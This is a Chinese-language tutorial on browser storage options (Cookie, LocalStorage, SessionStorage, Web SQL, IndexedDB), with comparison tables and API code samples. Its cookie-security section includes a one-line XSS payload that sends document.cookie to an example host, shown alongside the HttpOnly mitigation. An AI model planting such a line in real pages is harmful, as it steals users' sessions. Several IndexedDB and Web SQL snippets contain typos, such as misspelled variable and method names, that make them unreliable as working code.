# 浏览器存储
前端涉及多种数据存储方式，每种方式都有其自身的特点和适用场景。

## 数据存储分类
在开发Web应用的过程中，会涉及一些数据的存储需求，常见的存储方式可能有：
* 保存登录态的Cookie
* 适用浏览器本地存储进行保存的Local Storage和Session Storage
* 客户端数据持久化存储方案涉及的Web SQL和IndexedDB
* 直接存储在本机的文件系统上

对于这些存储方式，可以从以下5个维度对其进行分类：
1. 实时性：在进行数据存储与取用操作时，根据该操作是否会阻塞当前活动线程的执行，可以将存储方式划分为同步和异步。在一些浏览器中对同步方式来说，由于存取操作可能与页面渲染共享主线程，如果阻塞时间过长必然会给使用体验带来沉重负担，所以出于对体验性能和执行效率的考虑，通常会优先选取异步存储方式。文件系统、WebSQL和IndexedDB都是异步方式，而本地存储的Local Storage和Session Storage方式则是同步方式。

2. 数据模型：数据模型指的是每个数据项或数据单元的存储形式，有像数据库表字段中的结构化方式，也有像非关系型数据库中的键值对方式，以及文件系统中按字节流的存储方式，不同方式可能会影响数据存取的易用性、成本及性能。结构化数据与基于SQL的典型数据库管理系统类似，在预定义的表格数据中进行数据存取，适用于灵活的动态查询。而键值对方式则允许使用者按照唯一索引来存储和检索数据，易用且快捷。
3. 事务处理：事务通常指作为单个逻辑工作单元执行的一系列操作，事务若想正确处理执行需要满足四个基本要素：原子性(Atomicity)，事务中所有操作要么全都完成要么全都不完成，不会停留在中间的某个操作中。一致性(Consistency)，事务提交之后，数据库状态能够满足原有约束。隔离性(Isolation)，事务与事务之间不会发生干扰。持久性(Durability)，事务对数据的修改都是确定的。通常数据库管理系统都会支持事务处理，而对Web应用本地存储的大部分场景来说这一点并非需要，但其提供的原子性有时却非常重要。
4. 持久化：持久化指的是数据留存的实效性，可分为会话级、设备级和全局级，会话级的持久化指仅在当前浏览器标签处于活动状态时，网页中所保存的数据有效，当关闭浏览器页签后数据随之消失，Session Storage的持久化就属于会话级。设备级的持久化允许跨浏览器标签页进行数据存取，大部分存储方式都属于设备级。全局级持久化要求能够跨设备与跨会话存储数据，即能够将数据存储在云端，这也是十分可靠的持久化方式。
5. 浏览器支持：目前市面上的浏览器种类及版本多种多样，并非所有本地存储方式都能得到浏览器的全面支持。所以开发者在技术选型时，应当充分考虑到自己业务受众所使用浏览器的分布情况，以及浏览器对相应API的留存寿命与使用边界。经验告诉我们，通常经过标准化确立的API会得到各大浏览器厂商的广泛支持，同时API的留存寿命也更长久。

| 存储方式 | 实时性 | 数据模型 | 事务处理 | 持久化 | 浏览器支持 |
| ------- | ----- | ------ | ------ | ------ | -------- |
|Cookie | 同步 |结构化 |不支持 | 设备级 | 都支持 |
| Local Storage | 同步 | 键值 | 不支持 | 设备级 |93.04% |
| Session Storage | 同步 |键值| 不支持 |会话级 |93.95% |
| WebSQL | 异步 |结构化 | 支持 | 设备级 | 76.04% |
| IndexedDB |异步 | 皆有 |支持 | 设备级 | 96.26% |
| 文件系统 |异步 | 字节流 | 不支持 |设备级 | 68.41% |
| 云存储 |皆有|字节流 |不支持 |全局级 |都支持 |

## Cookie
Cookie是服务器创建后发送到用户浏览器并保存在本地的一小块数据，在该浏览器下次向同一服务器发起请求时，它将被携带并发送到服务器上。它的作用通常是告诉服务器，先后两次请求来自同一浏览器，这样便可用来保存用户的登录状态，使基于无状态的HTTP协议能够记录状态信息。

Cookie是1993年诞生的，它的目的就是为了区分http请求它的客户端的情况。因为HTTP请求是无状态的，无状态是指当HTTP请求结束后，它的连接就关闭了。那么下一次请求，服务端就不会知道这个请求和之前的某个请求来自同一客户端，它不能跟踪HTTP请求它的会话情况。那么这样我们就产生登录信息、用户信息的维护问题，所以需要Cookie去维护客户端的状态。

随着Web技术的发展，现代浏览器已经开始支持各种各样的存储方式，同时由于服务器指定了Cookie后，浏览器每次请求都会携带Cookie数据，这样势必会带来额外的带宽开销，所以Cookie正逐渐被一些新的浏览器存储方式淘汰。

### 响应与请求
Cookie的生成可以通过服务端HTTP Response Header的Set-Cookie字段向浏览器发送Cookie信息
```html
Set-Cookie: test_uuid= fbb93b6a-d706-401e-b27a-9f6619d83274
```
当浏览器检测到服务端返回的Response Header中有cookie的信息，就会把信息内容存储到客户端的Cookie存储区域中。浏览器接收到请求后再次向服务器发送请求时会在Cookie字段中携带Cookie信息。
```html
Cookie:test_uuid= fbb93b6a-d706-401e-b27a-9f6619d83274
```
每条Cookie信息以"cookie名=cookie值"的形式定义，多个Cookie信息之间以分号间隔。

### 持久性
Cookie支持会话级的Cookie，即浏览器关闭后会被自动删除，其仅在页面会话期内有效。除此之外，还有一种持久性的Cookie，通过指定一个过期时间或有效期来变更默认Cookie的持久性。
```html
Set-Cookie: loginstate=1; Expires=Wed,13 Feb 2019 14:38:00 GMT;
```
### 安全性
由于通常会用Cookie来标识用户和授权会话，所以一旦Cookie被窃取，则可能导致授权用户的会话遭到攻击，一种常见的窃取方法便是XSS攻击。
```js
(new Image()).src="http://www.example.com/xxx?cookie="+document.cookie
```
JS通过调用document.cookie的方式可以拿到存储在浏览器中的Cookie信息，然后通过新建图片的src属性赋值目标URL来发起请求，对此可以通过给Cookie中设置HttpOnly字段阻止JavaScript对其访问性来缓解此类攻击。

### Cookie的特点
Cookie它主要有以下特点
* 作为浏览器存储，大小只有4KB左右
* 需要设置过期时间expire
* 设置httponly不允许js读写，防止黑客攻击

所以Cookie有两种作用，一种是用于浏览器端和服务器端的交互，另一种是客户端自身数据的存储。在localstorage出现之后cookie存储数据能力就被localstorage取代了。

### Cookie的优化
由于cookie在访问对应域名下的资源时都会通过HTTP请求发送到服务器，尤其是js、css静态资源，不需要携带cookie，因此会造成CDN的流量损耗，所以建议将CDN的域名和主站域名分开。

## LocalStorage
由于cookie在本地存储的各种不便，所以在HTML5中设计出了专门用于浏览器存储的LocalStorage。它的大小在5M左右，它仅仅只在客户端使用，不和服务器端进行通信。

它是作为浏览器缓存方案而存在，例如我们请求一个网站页面，该页面由于网络导致请求资源较慢，一些网站信息需要请求接口来获取再显示，而有些网站信息是暂时不变得，那么我们就直接进行存储，再次请求的时候从缓存获取数据显示即可，等到接口请求过来后再替换存储的数据。所以我们经常用LocalStorage来作为缓存，优化首屏渲染。

存储在Local Storage中的数据没有过期时间的设置，除非显式的去清除，因为数据是保存在浏览器本地硬件设备中的，所以即使关闭浏览器，该部分数据依旧存在，在下次打开浏览器访问网站时仍可继续使用。

它的接口封装较好，提供了setItem、getItem、removeItem、clear四个方法。
```js
//向localstorage中添加或设置数据项
localStorage.setItem('myCat', 'Tom');
//以键名的方式从Localstorage中获取数据
let cat = localStorage.getItem('myCat');
//从localstorage中移除指定键名的数据项
localStorage.removeItem('myCat');
//清空Localstorage中的所有数据
localStorage.clear();
```
由于Local Storage仅能存储字符串内容，所以当存储对象、数组等复杂数据类型时，可用JSON.stringify先将其转化为字符串，在取用时通过JSON.parse再将其还原为原生数据类型。

## SessionStorage
SessionStorage和LocalStorage的区别是它是一个会话级别的浏览器存储，例如浏览器的一个标签页就是一个会话，当标签页关闭后，该存储就清空了。它的大小在5M左右，它仅仅只在客户端使用，不和服务器端进行通信。它的接口封装较好。

### 优化点
SessionStorage它的优化点在交互优化上，主要是用于对表单信息的维护，例如我们填写表单信息之后，刷新了浏览器，导致之前填写的信息没有了，交互体验很差，那么我们就可以使用SessionStorage进行存储，刷新页面之后把信息从SessionStorage获取回显到表单中，当关闭标签页之后就清空信息，重新打开页面是空的就重新填写。

其次SessionStorage也可以作为多页面表单的信息存储，例如我们将一个表单填写拆分成多个页面，有第一步、第二布，当我们在第二布编写完后不小心回退到上一步了，我们也需要把之前页面的信息维护起来，因为这个信息是整个表单的信息，所以可以用SessionStorage来进行存储。

## Web SQL
如果仅存储简单的字符串类型数据，则Local Storage和Session Storage能够很好支持，当面对复杂的关系型数据时，可能就有点力不从心了。为此HTML5规范引入了Web SQL数据库API，即一组使用SQL语句操作客户端数据库的API方法，如果你熟悉SQL语法，那么理解Web SQL将会很容易。

Web SQL包含三个核心方法：openDatabase()、transation()、executeSql()。要操作数据库首先需要使用openDatabase()方法，来打开或新建一个数据库对象，该方法接受五个参数，依次是：所要打开的数据库名称、版本号、描述文本、数据库大小及数据库创建完毕后的回调方法，最后一个参数也可默认，它默认会先去本地查询是否已有创建好的数据库，若无则创建一个新的数据库。
```js
const my_db = openDatabase('my_db','1.0','Test WebSQL DB','1024*1024');
```
执行SQL语句的executeSql()方法接受四个参数，分别是所要执行的SQL语句字符串，插入SQL查询语句中问号所在处的字符串数据，语句执行成功后的回调及失败的回调。
```js
my_db.transaction(function(tx) {
            tx.executeSql(
                'INSERT INTO STU (id,name) VALUES (?,?)',
                [id,'josh'], 
                ()=>console.info('添加数据陈宫'), 
                function(tx, err) {
                    console.error('添加数据失败',err.message);
                });
});
```


## IndexedDB 
IndexedDB是一种事务型数据库系统，其事务型类似基于SQL的关系型数据库管理系统，但是并不像其使用固定列表，而是一种基于JS的面向对象的数据库，更接近于NoSQL。它具有一些五个特点：
* 存储空间大，相比于Local Storage和Session Storage根据不同浏览器可能不足10MB的，IndexedDB一般来说不会少于250MB，甚至没有上限。
* 支持事务，即满足事务操作所要求的原子性，若在事务的一系列操作步骤中有一步失败，整个事务就会取消，IndexedDB便会回滚到事务发生之前的状态，不存在仅修改部分数据的情况。
* 支持多种数据模型，IndexedDB采用对象仓库存放数据，所有类型的数据都可以键值对的形式进行存储，每条数据都由唯一的主键进行讴吟。存储的类型不仅可以是对象、字符串，还可以是二进制数据。
* 同源约束，每个网页只能访问其自身域名下的数据库，不能跨域访问。
* 异步，IndexedDB的数据操作不会阻塞浏览器主线程，这让其可以在读写大量数据时也不会拖慢网页。

IndexDB所包含的API相对复杂一些，但只需在基本操作流程中掌握其从不同实体中抽象出的对象接口，这些实体对象接口包括：数据库对象IDBDatabase、对象仓库对象IDBObjectStore、索引对象IDBIndex、事务对象IDBTransaction、操作请求对象IDBRequest、指针对象IDBCursor、主键集合对象IDBKeyRange。

1. 打开或新建数据库
```js
const request = window.indexedDB.open('helloIndexDB', '1.0')
request.onsuccess = function(event) {
    const db = event.target.result // 数据库对象
    console.log('数据库打开成功')
}

request.onerror = function(event) {
    console.log('数据库打开报错')
}

request.onupgradeneeded = function(event) {
    // 数据库创建或升级的时候会触发
    console.log('onupgradeneeded')
    const db = event.target.result // 数据库对象
    let objectStore
    if (!db.objectStoreNames.contains('logs')) {
        objectStore = db.createObjectStore('logs', { keyPath: 'id'}) 
    }
}
```

2. 数据的增删改查：新增数据需要先创建一个事务，然后使用objectStore()方法拿到IDBObjectStore后，通过add()方法进行数据添加。
```js
const request = db.transaction(['logs'],'readwrite')
    .objectStore('logs')
    .add({id:1,log:'hello IndexedDB',time:1580978466694,user:'josh'})
request.onsuccess=function(event){console.log('新增数据成功')}
request.onerror=function(event){console.log('新增数据失败')}
```
与新增数据类似，只需将add()方法替换成其他相应的方法就可实现删除、修改及查询的功能，删除使用delete()方法，修改使用put()方法，查询使用get()方法。
```js
const objectStore = db.transaction('logs').objectStore('logs');
objectStore.openCursor().onsuccess=function(event){
    const curor = event.target.result;
    if(cursor){
        console.log('id:',cursor.key);
        console.log('log:',cursor.value.log);
        cursor.continue();
    }else{
        console.log('已无更多数据');
    }
}
```
3. 建立索引
建立索引可以让我们搜集数据表中的任意字段值，如果没有索引，则默认只能从主键进行取值。比如对于日志表可在新建时对用户user字段建立索引。
```js
objectStore.createIndex('user','user',{unique:false});
```
创建了索引后，便可使用user进行相关数据项的查找了
```js
const request = db.transation(['logs'],'readonly')
    .objectStore('logs')
    .index('user')
    .get('josh')
request.onsuccess=function(event){
    const result = e.target.result;
    if(result){
        //...相应处理
    }
}
```